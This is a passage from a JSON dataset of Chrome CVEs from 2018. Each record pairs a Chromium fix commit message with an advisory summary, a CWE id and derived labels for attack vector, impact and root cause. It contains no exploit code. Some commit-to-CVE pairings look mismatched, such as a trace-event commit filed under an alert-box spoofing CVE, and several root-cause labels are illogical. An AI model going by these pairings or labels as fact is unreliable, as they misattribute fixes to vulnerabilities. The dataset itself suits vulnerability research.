blob\/filesystem URLs for\nother origins.\n\nFor now, this CL does not provide the same enforcements for (2),\nOrigin header validation, which has additional constraints that need\nto be solved first (see https:\/\/crbug.com\/515309).\n\nBug: 886976, 888001\nChange-Id: I743ef05469e4000b2c0bee840022162600cc237f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1235343\nCommit-Queue: Alex Moshchuk <alexmos@chromium.org>\nReviewed-by: Charlie Reis <creis@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#594914}","summary":"Incorrect handling of blob URLS in Site Isolation in Google Chrome prior to 71.0.3578.80 allowed a remote attacker who had compromised the renderer process to bypass site isolation protections via a crafted HTML page.","commit_message_1":"lock down blob\/filesystem url creation with a stronger cpsp : :cancommiturl ( ) childprocesssecuritypolicy : :cancommiturl ( ) is a security check that's supposed to tell whether a given renderer process is allowed to commit a given url","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page","Impact":"bypass site isolation protections","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"9004be20a4cfde70456579489258c3aca4ed45a4","cve_id":"CVE-2018-18346","cwe_id":"CWE-20","commit_message":"Add trace event to sync_sessions::OnReadAllMetadata()\n\nIt is likely a cause of janks on UI thread on Android.\nAdd a trace event to get metrics about the duration.\n\nBUG=902203\n\nChange-Id: I4c4e9c2a20790264b982007ea7ee88ddfa7b972c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1319369\nReviewed-by: Mikel Astiz <mastiz@chromium.org>\nCommit-Queue: ssid <ssid@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#606104}","summary":"Incorrect handling of alert box display in Blink in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to present confusing browser UI via a crafted HTML page.","commit_message_1":"it is likely a cause of janks on ui thread on android","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"present confusing browser ui","Root Cause":"caused by incorrect security UI","Attack Type":"remote attacker"},{"commit_id":"0aa576040704401ae28ea73b862d0b5d84262d51","cve_id":"CVE-2018-18347","cwe_id":"CWE-20","commit_message":"Don't preserve NavigationEntry for failed navigations with invalid URLs.\n\nThe formatting logic may rewrite such URLs into an unsafe state.  This\nis a first step before preventing navigations to invalid URLs entirely.\n\nBug: 850824\nChange-Id: I71743bfb4b610d55ce901ee8902125f934a2bb23\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1252942\nReviewed-by: Alex Moshchuk <alexmos@chromium.org>\nCommit-Queue: Charlie Reis <creis@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#597304}","summary":"Incorrect handling of failed navigations with invalid URLs in Navigation in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to trick a user into executing javascript in an arbitrary origin via a crafted HTML page.","commit_message_1":"do n't preserve navigationentry for failed navigation with invalid url","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"trick a user into executing javascript in an arbitrary origin","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"5f8671e7667b8b133bd3664100012a3906e92d65","cve_id":"CVE-2018-18349","cwe_id":"CWE-732","commit_message":"Add a check for disallowing remote frame navigations to local resources.\n\nPreviously, RemoteFrame navigations did not perform any renderer-side\nchecks and relied solely on the browser-side logic to block disallowed\nnavigations via mechanisms like FilterURL.  This means that blocked\nremote frame navigations were silently navigated to about:blank\nwithout any console error message.\n\nThis CL adds a CanDisplay check to the remote navigation path to match\nan equivalent check done for local frame navigations.  This way, the\nrenderer can consistently block disallowed navigations in both cases\nand output an error message.\n\nBug: 894399\nChange-Id: I172f68f77c1676f6ca0172d2a6c78f7edc0e3b7a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1282390\nReviewed-by: Charlie Reis <creis@chromium.org>\nReviewed-by: Nate Chapin <japhet@chromium.org>\nCommit-Queue: Alex Moshchuk <alexmos@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#601022}","summary":"Remote frame navigations was incorrectly permitted to local resources in Blink in Google Chrome prior to 71.0.3578.80 allowed an attacker who convinced a user to install a malicious extension to access files on the local file system via a crafted Chrome Extension.","commit_message_1":"add a check for disallowing remote frame navigation to local resource","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"via a crafted chrome extension .","Impact":"bypass security restrictions","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"d683fb12566eaec180ee0e0506288f46cc7a43e7","cve_id":"CVE-2018-18350","cwe_id":null,"commit_message":"Inherit CSP when self-navigating to local-scheme URL\n\nAs the linked bug example shows, we should inherit CSP when we navigate\nto a local-scheme URL (even if we are in a main browsing context).\n\nBug: 799747\nChange-Id: I8413aa8e8049461ebcf0ffbf7b04c41d1340af02\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1234337\nReviewed-by: Mike West <mkwst@chromium.org>\nCommit-Queue: Andy Paicu <andypaicu@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#597889}","summary":"Incorrect handling of CSP enforcement during navigations in Blink in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to bypass content security policy via a crafted HTML page.","commit_message_1":"inherit csp when self-navigating to local-scheme url a the linked bug example show , we should inherit csp when we navigate to a local-scheme url ( even if we are in a main browsing context )","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page","Impact":"bypass content security policy","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"07fbae50670ea44e35e1d554db1bbece7fe3711f","cve_id":"CVE-2018-18351","cwe_id":"CWE-20","commit_message":"Check ancestors when setting an <iframe> navigation's \"site for cookies\".\n\nCurrently, we're setting the \"site for cookies\" only by looking at the\ntop-level document. We ought to be verifying that the ancestor frames\nare same-site before doing so. We do this correctly in Blink (see\n`Document::SiteForCookies`), but didn't do so when navigating in the\nbrowser.\n\nThis patch addresses the majority of the problem by walking the ancestor\nchain when processing a NavigationRequest. If all the ancestors are\nsame-site, we set the \"site for cookies\" to the top-level document's URL.\nIf they aren't all same-site, we set it to an empty URL to ensure that\nwe don't send SameSite cookies.\n\nBug: 833847\nChange-Id: Icd77f31fa618fa9f8b59fc3b15e1bed6ee05aabd\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1025772\nReviewed-by: Alex Moshchuk <alexmos@chromium.org>\nCommit-Queue: Mike West <mkwst@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#553942}","summary":"Lack of proper validation of ancestor frames site when sending lax cookies in Navigation in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to bypass SameSite cookie policy via a crafted HTML page.","commit_message_1":"check ancestor when setting an < iframe > navigation 's `` site for cooky ''","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"bypass samesite cookie policy","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"a9cbaa7a40e2b2723cfc2f266c42f4980038a949","cve_id":"CVE-2018-18352","cwe_id":"CWE-732","commit_message":"Simplify \"WouldTaintOrigin\" concept in media\/blink\n\nCurrently WebMediaPlayer has three predicates:\n - DidGetOpaqueResponseFromServiceWorker\n - HasSingleSecurityOrigin\n - DidPassCORSAccessCheck\n. These are used to determine whether the response body is available\nfor scripts. They are known to be confusing, and actually\nMediaElementAudioSourceHandler::WouldTaintOrigin misuses them.\n\nThis CL merges the three predicates to one, WouldTaintOrigin, to remove\nthe confusion. Now the \"response type\" concept is available and we\ndon't need a custom CORS check, so this CL removes\nBaseAudioContext::WouldTaintOrigin. This CL also renames\nURLData::has_opaque_data_ and its (direct and indirect) data accessors\nto match the spec.\n\nBug: 849942, 875153\nChange-Id: I6acf50169d7445c4ff614e80ac606f79ee577d2a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1238098\nReviewed-by: Fredrik Hubinette <hubbe@chromium.org>\nReviewed-by: Kinuko Yasuda <kinuko@chromium.org>\nReviewed-by: Raymond Toy <rtoy@chromium.org>\nCommit-Queue: Yutaka Hirano <yhirano@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#598258}","summary":"Service works could inappropriately gain access to cross origin audio in Media in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to bypass same origin policy for audio content via a crafted HTML page.","commit_message_1":"simplify `` wouldtaintorigin '' concept in media\/blink currently webmediaplayer ha three predicate : - didgetopaqueresponsefromserviceworker - hassinglesecurityorigin - didpasscorsaccesscheck","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"via a crafted html page .","Impact":"bypass security restrictions","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"d19a75fc26fd0ab1ce79ef3d1c1c9b3cc1fbd098","cve_id":"CVE-2018-18354","cwe_id":"CWE-20","commit_message":"Validate external protocols before launching on Windows\n\nBug: 889459\nChange-Id: Id33ca6444bff1e6dd71b6000823cf6fec09746ef\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1256208\nReviewed-by: Greg Thompson <grt@chromium.org>\nCommit-Queue: Mustafa Emre Acer <meacer@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#597611}","summary":"Insufficient validate of external protocols in Shell Integration in Google Chrome on Windows prior to 71.0.3578.80 allowed a remote attacker to launch external programs via a crafted HTML page.","commit_message_1":"validate external protocol before launching on window","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"launch external programs","Root Cause":"caused by insufficient data validation","Attack Type":"remote attacker"},{"commit_id":"4e4fec21ebd26d2ef20ac9f1ca0d2a16329f22bd","cve_id":"CVE-2018-18355","cwe_id":"CWE-20","commit_message":"Block modifier-letter-voicing character from domain names\n\nThis character (\u02ec) is easy to miss between other characters. It's one of the three characters from Spacing-Modifier-Letters block that ICU lists in its recommended set in uspoof.cpp. Two of these characters (modifier-letter-turned-comma and modifier-letter-apostrophe) are already blocked in crbug\/678812.\n\nBug: 896717\nChange-Id: I24b2b591de8cc7822cd55aa005b15676be91175e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1303037\nCommit-Queue: Mustafa Emre Acer <meacer@chromium.org>\nReviewed-by: Tommy Li <tommycli@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#604128}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted domain name.","commit_message_1":"block modifier-letter-voicing character from domain name this character ( \u02ec ) is easy to miss between other character","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"01e16ef252070f81b5f61ef4bfc0442422fd5d16","cve_id":"CVE-2018-18357","cwe_id":"CWE-20","commit_message":"Map U+10DE to 3 when checking for confusables\n\nGeorgian letter U+10DE (\u10de) looks similar to the number 3. This cl adds\nU+10DE to the mapping to 3 when determining whether to fall back to\npunycode when displaying URLs.\n\nBug: 895207\nChange-Id: I49713d7772428f8d364f371850a42913669acc4b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1284396\nCommit-Queue: Livvie Lin <livvielin@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#600193}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted domain name.","commit_message_1":"map u+10de to <number> when checking for confusables georgian letter u+10de ( \u10de ) look similar to the number <number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"da790f920bbc169a6805a4fb83b4c2ab09532d91","cve_id":"CVE-2018-18358","cwe_id":"CWE-20","commit_message":"Implicitly bypass localhost when proxying requests.\n\nThis aligns Chrome's behavior with the Windows and macOS proxy resolvers (but not Firefox).\n\nConcretely:\n * localhost names (as determined by net::IsLocalhost) now implicitly bypass the proxy\n * link-local IP addresses implicitly bypass the proxy\n\nThe implicit rules are handled by ProxyBypassRules, and it is possible to override them when manually configuring proxy settings (but not when using PAC or auto-detect).\n\nThis change also adds support for the \"<-loopback>\" proxy bypass rule, with similar semantics as it has on Windows (removes the implicit bypass rules for localhost and link-local).\n\nThe compatibility risk of this change should be low as proxying through localhost was not universally supported. It is however an idiom used in testing (a number of our own tests had such a dependency). Impacted users can use the \"<-loopback>\" bypass rule as a workaround.\n\nBug: 413511, 899126, 901896\nChange-Id: I263ca21ef9f12d4759a20cb4751dc3261bda6ac0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1303626\nCommit-Queue: Eric Roman <eroman@chromium.org>\nReviewed-by: Dominick Ng <dominickn@chromium.org>\nReviewed-by: Tarun Bansal <tbansal@chromium.org>\nReviewed-by: Matt Menke <mmenke@chromium.org>\nReviewed-by: Sami Ky\u00f6stil\u00e4 <skyostil@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#606112}","summary":"Lack of special casing of localhost in WPAD files in Google Chrome prior to 71.0.3578.80 allowed an attacker on the local network segment to proxy resources on localhost via a crafted WPAD file.","commit_message_1":"implicitly bypass localhost when proxying request","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted wpad file","Impact":"bypass security restrictions","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"2f0b419df243400f954e11b649f4862a1e0ff367","cve_id":"CVE-2018-20066","cwe_id":"CWE-416","commit_message":"Fix the regression caused by http:\/\/crrev.com\/c\/1288350.\n\nBug: 900124,856135\nChange-Id: Ie11ad406bd1ea383dc2a83cc8661076309154865\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1317010\nReviewed-by: Lan Wei <azurewei@chromium.org>\nCommit-Queue: Shu Chen <shuchen@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#605282}","summary":"Incorrect object lifecycle in Extensions in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fix the regression caused by http : \/\/<file>\/c\/<number>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"a7d715ae5b654d1f98669fd979a00282a7229044","cve_id":"CVE-2018-20067","cwe_id":"CWE-254","commit_message":"Prevent renderer initiated back navigation to cancel a browser one.\n\nRenderer initiated back\/forward navigations must not be able to cancel ongoing\nbrowser initiated navigation if they are not user initiated.\n\nNote: 'normal' renderer initiated navigation uses the\nFrameHost::BeginNavigation() path. A code similar to this patch is done\nin NavigatorImpl::OnBeginNavigation().\n\nTest:\n-----\n\nAdded: NavigationBrowserTest.\n * HistoryBackInBeforeUnload\n * HistoryBackInBeforeUnloadAfterSetTimeout\n * HistoryBackCancelPendingNavigationNoUserGesture\n * HistoryBackCancelPendingNavigationUserGesture\n\nFixed:\n * (WPT) ...\/the-history-interface\/traverse_the_history_2.html\n * (WPT) ...\/the-history-interface\/traverse_the_history_3.html\n * (WPT) ...\/the-history-interface\/traverse_the_history_4.html\n * (WPT) ...\/the-history-interface\/traverse_the_history_5.html\n\nBug: 879965\nChange-Id: I1a9bfaaea1ffc219e6c32f6e676b660e746c578c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1209744\nCommit-Queue: Arthur Sonzogni <arthursonzogni@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nReviewed-by: Mustaq Ahmed <mustaq@chromium.org>\nReviewed-by: Camille Lamy <clamy@chromium.org>\nReviewed-by: Charlie Reis <creis@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#592823}","summary":"A renderer initiated back navigation was incorrectly allowed to cancel a browser initiated one in Navigation in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to confuse the user about the origin of the current page via a crafted HTML page.","commit_message_1":"prevent renderer initiated back navigation to cancel a browser one","Vulnerability Type":"Security Features","Attack Vector":"via a crafted html page","Impact":"provide weaker than expected security","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"4f8104c528f0147c7527718d5aa7c9c38c8220d0","cve_id":"CVE-2018-20068","cwe_id":"CWE-20","commit_message":"Abort navigations on 304 responses.\n\nA recent change (https:\/\/chromium-review.googlesource.com\/1161479)\naccidentally resulted in treating 304 responses as downloads. This CL\ntreats them as ERR_ABORTED instead. This doesn't exactly match old\nbehavior, which passed them on to the renderer, which then aborted them.\n\nThe new code results in correctly restoring the original URL in the\nomnibox, and has a shiny new test to prevent future regressions.\n\nBug: 882270\nChange-Id: Ic73dcce9e9596d43327b13acde03b4ed9bd0c82e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1252684\nCommit-Queue: Matt Menke <mmenke@chromium.org>\nReviewed-by: Camille Lamy <clamy@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#595641}","summary":"Incorrect handling of 304 status codes in Navigation in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to confuse the user about the origin of the current page via a crafted HTML page.","commit_message_1":"abort navigation on <number> response","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"confuse the user about the origin of the current page","Root Cause":"caused by incorrect handling of 304 status codes","Attack Type":"remote attacker"},{"commit_id":"37c5e5e604744c9efd4fa5a3abaca7e6b651054c","cve_id":"CVE-2018-20069","cwe_id":"CWE-254","commit_message":"[css-typed-om] values attribute should be readonly\n\nvalues attribute should be immutable to prevent cyclic\nreferences in CSSMathMax, CSSMathMin, CSSMathProduct,\nCSSMathSum.\n\nBug: 803687\nChange-Id: Ibb93165ffd7a279a80febba0543ac186b67dbe56\nReviewed-on: https:\/\/chromium-review.googlesource.com\/890558\nReviewed-by: Darren Shen <shend@chromium.org>\nCommit-Queue: Hwanseung Lee <hs1217.lee@samsung.com>\nCr-Commit-Position: refs\/heads\/master@{#532336}","summary":"Failure to prevent navigation to top frame to data URLs in Navigation in Google Chrome on iOS prior to 71.0.3578.80 allowed a remote attacker to confuse the user about the origin of the current page via a crafted HTML page.","commit_message_1":"value attribute should be readonly value attribute should be immutable to prevent cyclic reference in cssmathmax , cssmathmin , cssmathproduct , cssmathsum","Vulnerability Type":"Security Features","Attack Vector":"via a crafted html page","Impact":"confuse the user about the origin of the current page","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"cabd5a9c5b2cc447ba34f464de1c8c9dea207077","cve_id":"CVE-2018-20070","cwe_id":"CWE-20","commit_message":"Map U+0909 and U+0993 to 3 when checking for confusables\n\nU+0909 (\u0909) and U+0993 (\u0993) look similar to the number 3. Thic cl adds\nthese two characters to the mapping to 3 when determining whether to\nfall back to punycode when displaying URLs.\n\nBug: 895885\nChange-Id: I233127570c8e34e791ef5663c1ece9207d6c7bda\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1287031\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCommit-Queue: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#600544}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 71.0.3578.80 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted domain name.","commit_message_1":"map u+<number> and u+<number> to <number> when checking for confusables u+<number> ( \u0909 ) and u+<number> ( \u0993 ) look similar to the number <number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by incorrect handling of confusable characters","Attack Type":"remote attacker"},{"commit_id":"562da5192ff110199fe290bdb7ea76d8118071fd","cve_id":"CVE-2018-20071","cwe_id":null,"commit_message":"[Payments] Restrict just-in-time payment handler to payment method domain and its subdomains\n\nBug: 853937\nChange-Id: I148b3d96950a9d90fa362e580e9593caa6b92a36\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1132116\nReviewed-by: Mathieu Perreault <mathp@chromium.org>\nCommit-Queue: Ganggui Tang <gogerald@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#573911}","summary":"Insufficiently strict origin checks during JIT payment app installation in Payments in Google Chrome prior to 70.0.3538.67 allowed a remote attacker to install a service worker for a domain that can host attacker controled files via a crafted HTML page.","commit_message_1":"restrict just-in-time payment handler to payment method domain and it subdomains","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page","Impact":"install a service worker for a domain that can host attacker controled files","Root Cause":"caused by insufficiently strict origin checks during JIT payment app installation","Attack Type":"remote attacker"},{"commit_id":"9d2ead1650a1c901754dd1a68705006a6934cffc","cve_id":"CVE-2018-17462","cwe_id":"CWE-20","commit_message":"Refcount AppCacheGroup correctly.\n\nBug: 888926\nChange-Id: Iab0d82d272e2f24a5e91180d64bc8e2aa8a8238d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1246827\nReviewed-by: Marijn Kruisselbrink <mek@chromium.org>\nReviewed-by: Joshua Bell <jsbell@chromium.org>\nCommit-Queue: Chris Palmer <palmer@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#594475}","summary":"Incorrect refcounting in AppCache in Google Chrome prior to 70.0.3538.67 allowed a remote attacker to perform a sandbox escape via a crafted HTML page.","commit_message_1":"refcount appcachegroup correctly","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"perform a sandbox escape","Root Cause":"caused by a sandbox escape","Attack Type":"remote attacker"},{"commit_id":"7da6c3419fd172405bcece1ae4ec6ec8316cd345","cve_id":"CVE-2018-17467","cwe_id":"CWE-20","commit_message":"Start rendering timer after first navigation\n\nCurrently the new content rendering timer in the browser process,\nwhich clears an old page's contents 4 seconds after a navigation if the\nnew page doesn't draw in that time, is not set on the first navigation\nfor a top-level frame.\n\nThis is problematic because content can exist before the first\nnavigation, for instance if it was created by a javascript: URL.\n\nThis CL removes the code that skips the timer activation on the first\nnavigation.\n\nBug: 844881\nChange-Id: I19b3ad1ff62c69ded3a5f7b1c0afde191aaf4584\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1188589\nReviewed-by: Fady Samuel <fsamuel@chromium.org>\nReviewed-by: ccameron <ccameron@chromium.org>\nCommit-Queue: Ken Buchanan <kenrb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#586913}","summary":"Insufficiently quick clearing of stale rendered content in Navigation in Google Chrome prior to 70.0.3538.67 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"start rendering timer after first navigation currently the new content rendering timer in the browser process , which clear an old page 's content <number> second after a navigation if the new page doe n't draw in that time , is not set on the first navigation for a top-level frame","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"5fe74f831fddb92afa5ddfe46490bb49f083132b","cve_id":"CVE-2018-17468","cwe_id":"CWE-200","commit_message":"Do not forward resource timing to parent frame after back-forward navigation\n\nLocalFrame has |should_send_resource_timing_info_to_parent_| flag not to\nsend timing info to parent except for the first navigation. This flag is\ncleared when the first timing is sent to parent, however this does not happen\nif iframe's first navigation was by back-forward navigation. For such\niframes, we shouldn't send timings to parent at all.\n\nBug: 876822\nChange-Id: I128b51a82ef278c439548afc8283ae63abdef5c5\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1186215\nReviewed-by: Kinuko Yasuda <kinuko@chromium.org>\nCommit-Queue: Kunihiko Sakamoto <ksakamoto@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#585736}","summary":"Incorrect handling of timer information during navigation in Blink in Google Chrome prior to 70.0.3538.67 allowed a remote attacker to obtain cross origin URLs via a crafted HTML page.","commit_message_1":"do not forward resource timing to parent frame after back-forward navigation localframe ha |should_send_resource_timing_info_to_parent_| flag not to send timing info to parent except for the first navigation","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"obtain cross origin urls","Root Cause":"caused by a cross-origin leak","Attack Type":"remote attacker"},{"commit_id":"385508dc888ef15d272cdd2705b17996abc519d6","cve_id":"CVE-2018-17470","cwe_id":"CWE-119","commit_message":"Implement immutable texture base\/max level clamping\n\nIt seems some drivers fail to handle that gracefully, so let's always clamp\nto be on the safe side.\n\nBUG=877874\nTEST=test case in the bug, gpu_unittests\nR=kbr@chromium.org\n\nCq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel\nChange-Id: I6d93cb9389ea70525df4604112223604577582a2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1194994\nReviewed-by: Kenneth Russell <kbr@chromium.org>\nCommit-Queue: Zhenyao Mo <zmo@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#587264}","summary":"A heap buffer overflow in GPU in Google Chrome prior to 70.0.3538.67 allowed a remote attacker who had compromised the renderer process to potentially perform a sandbox escape via a crafted HTML page.","commit_message_1":"implement immutable texture base\/max level clamping it seems some driver fail to handle that gracefully , so let 's always clamp to be on the safe side","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially perform a sandbox escape","Root Cause":"caused by a memory corruption","Attack Type":"remote attacker"},{"commit_id":"d18c519758c2e6043f0e1f00e2b69a55b3d7997f","cve_id":"CVE-2018-17471","cwe_id":"CWE-20","commit_message":"Security drop fullscreen for any nested WebContents level.\n\nThis relands 3dcaec6e30feebefc11e with a fix to the test.\n\nBUG=873080\nTEST=as in bug\n\nChange-Id: Ie68b197fc6b92447e9633f233354a68fefcf20c7\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1175925\nReviewed-by: Sidney San Mart\u00edn <sdy@chromium.org>\nCommit-Queue: Avi Drissman <avi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#583335}","summary":"Incorrect dialog placement in WebContents in Google Chrome prior to 70.0.3538.67 allowed a remote attacker to obscure the full screen warning via a crafted HTML page.","commit_message_1":"security drop fullscreen for any nested webcontents level","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"obscure the full screen warning","Root Cause":"caused by a security UI occlusion","Attack Type":"remote attacker"},{"commit_id":"3983030c2ee3e54afa60fe24f23e4c98067a3634","cve_id":"CVE-2018-17473","cwe_id":"CWE-20","commit_message":"Add additional Lao character to IDN confusables\n\n  U+0E01 (\u0e01) => n\n\nPrior Lao\/Thai entries were added in crrev.com\/c\/1058710.\n\nTest: components_unittests --gtest_filter=*IDN*\nBug: 882078\nChange-Id: I1e90b144a1d791341b515d026a6bc4be7cbed57d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1220773\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCommit-Queue: Christopher Thompson <cthomp@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#591227}","summary":"Incorrect handling of confusable characters in Omnibox in Google Chrome prior to 70.0.3538.67 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted domain name.","commit_message_1":"add additional lao character to idn confusables u+0e01 ( \u0e01 ) = > n prior lao\/thai entry were added in <file>\/c\/<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"54139dd9a60d8fb63d2379a08e2f2750eac2d959","cve_id":"CVE-2018-17474","cwe_id":"CWE-416","commit_message":"Speculative fix for crashes in HTMLImportsController::Dispose().\n\nCopy the loaders_ vector before iterating it.\nThis CL has no tests because we don't know stable reproduction.\n\nBug: 843151\nChange-Id: I3d5e184657cbce56dcfca0c717d7a0c464e20efe\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1245017\nReviewed-by: Keishi Hattori <keishi@chromium.org>\nCommit-Queue: Kent Tamura <tkent@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#594226}","summary":"Use after free in HTMLImportsController in Blink in Google Chrome prior to 70.0.3538.67 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"speculative fix for crash in htmlimportscontroller : :dispose ( )","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"3d41e77125f3de8d722b6d8303599abaf2a91667","cve_id":"CVE-2018-17476","cwe_id":"CWE-20","commit_message":"If a dialog is shown, drop fullscreen.\n\nBUG=875066, 817809, 792876, 812769, 813815\nTEST=included\n\nChange-Id: Ic3d697fa3c4b01f5d7fea77391857177ada660db\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1185208\nReviewed-by: Sidney San Mart\u00edn <sdy@chromium.org>\nCommit-Queue: Avi Drissman <avi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#586418}","summary":"Incorrect dialog placement in Cast UI in Google Chrome prior to 70.0.3538.67 allowed a remote attacker to obscure the full screen warning via a crafted HTML page.","commit_message_1":"if a dialog is shown , drop fullscreen","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"obscure the full screen warning","Root Cause":"caused by a security UI occlusion","Attack Type":"remote attacker"},{"commit_id":"01c9a7e71ca435651723e8cbcab0b3ad4c5351e2","cve_id":"CVE-2018-6031","cwe_id":"CWE-416","commit_message":"[pdf] Use a temporary list when unloading pages\n\nWhen traversing the |deferred_page_unloads_| list and handling the\nunloads it's possible for new pages to get added to the list which will\ninvalidate the iterator.\n\nThis CL swaps the list with an empty list and does the iteration on the\nlist copy. New items that are unloaded while handling the defers will be\nunloaded at a later point.\n\nBug: 780450\nChange-Id: 